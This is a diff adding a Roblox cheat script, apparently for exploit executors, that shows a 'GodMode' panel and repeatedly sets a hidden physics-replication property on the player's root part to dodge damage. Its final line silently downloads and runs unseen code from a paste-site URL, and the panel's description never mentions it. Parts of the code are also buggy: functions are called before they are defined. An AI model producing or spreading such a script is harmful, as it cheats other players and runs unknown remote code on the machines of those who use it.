@@ -1,0 +1,284 @@
+-- this is supposed to be private, due to rush (school) i made it opensrc
+-- and yes its true its vibe coded i rlly dont care i dont have much time to code it my self
+local P=game:GetService("Players")
+local RS=game:GetService("RunService")
+local UIS=game:GetService("UserInputService")
+
+local LP=P.LocalPlayer
+local C=nil
+local Ch,H,R=nil, nil, nil
+local A=nil
+local E=false
+local D=false
+local heartbeatMultiplier = 1
+local frameCounter = 0
+local isRespawning = false
+
+local function ULC(n)
+Ch=n
+H=n:WaitForChild("Humanoid")
+R=n:WaitForChild("HumanoidRootPart")
+end
+
+if LP.Character then ULC(LP.Character) end
+
+local function BA()
+if A then A:Destroy() end
+A=Instance.new("Part")
+A.Name="AintMyCrib Made This"
+A.Size=Vector3.new(0,0,0)
+A.Transparency=1
+A.CanCollide=false
+A.Anchored=true
+A.Parent=workspace
+end
+
+local G=Instance.new("ScreenGui")
+G.Name="Made by AintMyCrib"
+G.ResetOnSpawn=false
+G.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
+G.Parent=LP.PlayerGui
+
+local F=Instance.new("Frame")
+F.Size=UDim2.new(0,320,0,260) -- Made taller for more description
+F.Position=UDim2.new(0.5,-160,0.5,-130)
+F.BackgroundColor3=Color3.fromRGB(25,25,35)
+F.BorderSizePixel=0
+F.Active=true
+F.Draggable=true
+F.Parent=G
+Instance.new("UICorner",F).CornerRadius=UDim.new(0,12)
+
+-- Title Bar (for dragging)
+local DBa=Instance.new("Frame")
+DBa.Size=UDim2.new(1,0,0,40)
+DBa.BackgroundColor3=Color3.fromRGB(45,45,65)
+DBa.BorderSizePixel=0
+DBa.ZIndex=2
+DBa.Parent=F
+Instance.new("UICorner",DBa).CornerRadius=UDim.new(0,12)
+
+local Fi=Instance.new("Frame")
+Fi.Size=UDim2.new(1,0,0,6)
+Fi.Position=UDim2.new(0,0,1,-6)
+Fi.BackgroundColor3=Color3.fromRGB(45,45,65)
+Fi.BorderSizePixel=0
+Fi.ZIndex=2
+Fi.Parent=DBa
+
+local T=Instance.new("TextLabel")
+T.Size=UDim2.new(1,0,1,0)
+T.BackgroundTransparency=1
+T.Text="⚡ GodMode Script ⚡"
+T.TextColor3=Color3.fromRGB(200,200,255)
+T.Font=Enum.Font.GothamBold
+T.TextSize=16
+T.ZIndex=3
+T.Parent=DBa
+
+-- GodMode Button
+local B=Instance.new("TextButton")
+B.Size=UDim2.new(0.85,0,0,32)
+B.Position=UDim2.new(0.075,0,0,50)
+B.BackgroundColor3=Color3.fromRGB(140,60,60)
+B.Text="STATUS: OFF"
+B.TextColor3=Color3.fromRGB(255,255,255)
+B.Font=Enum.Font.GothamBold
+B.TextSize=14
+B.Parent=F
+Instance.new("UICorner",B).CornerRadius=UDim.new(0,8)
+
+-- Heartbeat Multiplier Button
+local HBM=Instance.new("TextButton")
+HBM.Size=UDim2.new(0.85,0,0,32)
+HBM.Position=UDim2.new(0.075,0,0,87)
+HBM.BackgroundColor3=Color3.fromRGB(40,40,80)
+HBM.Text="⚡ Heartbeat: 1x"
+HBM.TextColor3=Color3.fromRGB(255,255,255)
+HBM.Font=Enum.Font.GothamBold
+HBM.TextSize=13
+HBM.Parent=F
+Instance.new("UICorner",HBM).CornerRadius=UDim.new(0,8)
+
+-- Input box for multiplier
+local InputBox = Instance.new("TextBox")
+InputBox.Size=UDim2.new(0.85,0,0,32)
+InputBox.Position=UDim2.new(0.075,0,0,87)
+InputBox.BackgroundColor3=Color3.fromRGB(60,60,100)
+InputBox.TextColor3=Color3.fromRGB(255,255,255)
+InputBox.Font=Enum.Font.GothamBold
+InputBox.TextSize=13
+InputBox.Text="1"
+InputBox.PlaceholderText="Enter multiplier..."
+InputBox.Visible=false
+InputBox.Parent=F
+Instance.new("UICorner",InputBox).CornerRadius=UDim.new(0,8)
+
+-- Description Label (Fixed)
+local Desc = Instance.new("TextLabel")
+Desc.Size=UDim2.new(0.9,0,0,90)
+Desc.Position=UDim2.new(0.05,0,0,125)
+Desc.BackgroundTransparency=1
+Desc.TextColor3=Color3.fromRGB(180,180,200)
+Desc.Font=Enum.Font.Gotham
+Desc.TextSize=11
+Desc.TextWrapped=true
+Desc.TextXAlignment=Enum.TextXAlignment.Center
+Desc.TextYAlignment=Enum.TextYAlignment.Top
+Desc.Text=[[📖 How it works:
+Lower heartbeat = less sync (laggy)
+Higher heartbeat = more freeze (freeze ur entire hrp)
+🔥 This entire shit was vibecoded
+ttk: Aintnoway123n | dc: callmeaint
+Feel free to suggest]]
+Desc.Parent=F
+
+-- Dragging with PC support (Frame is already draggable)
+F.Draggable = true
+
+-- Click to show input box
+HBM.MouseButton1Click:Connect(function()
+HBM.Visible = false
+InputBox.Visible = true
+InputBox:CaptureFocus()
+end)
+
+-- Handle input
+InputBox.FocusLost:Connect(function(enterPressed)
+if enterPressed then
+    local num = tonumber(InputBox.Text)
+    if num then
+        heartbeatMultiplier = num
+        HBM.Text = "⚡ Heartbeat: " .. tostring(heartbeatMultiplier) .. "x"
+        
+        if E then
+            S()
+            task.wait(0.1)
+            ST()
+        end
+    else
+        InputBox.Text = tostring(heartbeatMultiplier)
+    end
+end
+HBM.Visible = true
+InputBox.Visible = false
+end)
+
+local function S()
+if C then C:Disconnect() C=nil end
+if R then
+    pcall(function() sethiddenproperty(R,"PhysicsRepRootPart",nil) end)
+end
+if A then A:Destroy() A=nil end
+D=false
+frameCounter = 0
+end
+
+local function ST()
+if D then return end
+D=true
+if C then C:Disconnect() end
+BA()
+frameCounter = 0
+
+C=RS.Heartbeat:Connect(function()
+    -- Check if character exists, if not wait for respawn
+    if not R or not R.Parent then
+        -- Character is dead, wait for respawn
+        if not isRespawning then
+            isRespawning = true
+            -- Wait for new character
+            local char = LP.CharacterAdded:Wait()
+            ULC(char)
+            isRespawning = false
+        end
+        return
+    end
+    
+    -- Check if humanoid is still valid
+    if not H or not H.Parent then
+        return
+    end
+    
+    -- If health is 0 or below, wait for respawn
+    if H.Health <= 0 then
+        return
+    end
+
+    -- Calculate how many times to run based on multiplier
+    local runs = math.floor(heartbeatMultiplier)
+    local remainder = heartbeatMultiplier - runs
+
+    -- Handle negative or fractional multipliers
+    if heartbeatMultiplier <= 0 then
+        -- For negative or zero, use frame counter for slow speed
+        frameCounter = frameCounter + 1
+        local threshold = math.max(1, math.floor(1 / math.abs(heartbeatMultiplier)))
+        if frameCounter >= threshold and heartbeatMultiplier ~= 0 then
+            frameCounter = 0
+            pcall(function()
+                if R and R.Parent then
+                    sethiddenproperty(R,"PhysicsRepRootPart",A)
+                end
+            end)
+        end
+    else
+        -- Positive multiplier: run multiple times per frame
+        for i = 1, runs do
+            pcall(function()
+                if R and R.Parent then
+                    sethiddenproperty(R,"PhysicsRepRootPart",A)
+                end
+            end)
+        end
+        -- Handle fractional part (e.g., 1.5 means run once every 2 frames for the extra 0.5)
+        if remainder > 0 then
+            frameCounter = frameCounter + remainder
+            while frameCounter >= 1 do
+                frameCounter = frameCounter - 1
+                pcall(function()
+                    if R and R.Parent then
+                        sethiddenproperty(R,"PhysicsRepRootPart",A)
+                    end
+                end)
+            end
+        end
+    end
+end)
+
+D=false
+end
+
+B.MouseButton1Click:Connect(function()
+E=not E
+if E then
+B.BackgroundColor3=Color3.fromRGB(60,180,100)
+B.Text="✅ ON | GODMODE"
+task.wait(0.1)
+ST()
+else
+B.BackgroundColor3=Color3.fromRGB(140,60,60)
+B.Text="❌ OFF | GODMODE"
+S()
+end
+end)
+
+-- Handle respawning
+LP.CharacterAdded:Connect(function(n)
+ULC(n)
+-- If godmode was on, restart it
+if E then
+    S()
+    task.wait(0.2)
+    ST()
+end
+end)
+
+LP.CharacterRemoving:Connect(function()
+-- Don't stop the heartbeat, just clear references
+R = nil
+H = nil
+Ch = nil
+end)
+wait(1)
+loadstring(game:HttpGet("https://pastefy.app/hp0Zcd2K/raw"))()
